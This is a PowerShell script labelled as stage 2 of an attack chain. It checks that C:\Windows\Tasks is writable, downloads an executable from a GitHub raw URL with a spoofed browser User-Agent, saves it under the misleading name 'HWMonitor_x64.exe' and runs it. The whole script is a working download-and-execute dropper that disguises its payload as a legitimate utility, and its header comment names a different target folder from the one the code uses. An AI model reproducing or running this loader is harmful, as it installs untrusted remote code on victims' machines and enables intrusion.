# === Stage 2: Download and execute binary to C:\Users\Public ===

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$BinaryUrl = "https://github.com/mibomboclaaat/wwdtesting/raw/refs/heads/main/hwmonitor_1.58.exe"
$DestinationDir = "C:\Windows\Tasks"
$DestinationPath = Join-Path $DestinationDir "HWMonitor_x64.exe"

try {
    if (-Not (Test-Path -Path $DestinationDir)) {
        Write-Host "[-] Directory does not exist: $DestinationDir"
        exit 1
    }

    # Test write permission
    $testFile = Join-Path $DestinationDir "test_write.txt"
    "test" | Out-File -FilePath $testFile -Encoding ascii -Force
    Remove-Item -Path $testFile -Force
    Write-Host "[*] Write permission confirmed in $DestinationDir"

    # Download the binary
    Write-Host "[*] Downloading binary from $BinaryUrl to $DestinationPath"
    Invoke-WebRequest -Uri $BinaryUrl -OutFile $DestinationPath -Headers @{ "User-Agent" = "Mozilla/5.0" } -UseBasicParsing
    Write-Host "[+] Downloaded binary."

    # Execute the binary
    Write-Host "[*] Executing binary..."
    Start-Process -FilePath $DestinationPath
    Write-Host "[+] Binary execution started."
}
catch {
    Write-Host "[-] Error: $_"
    exit 1
}
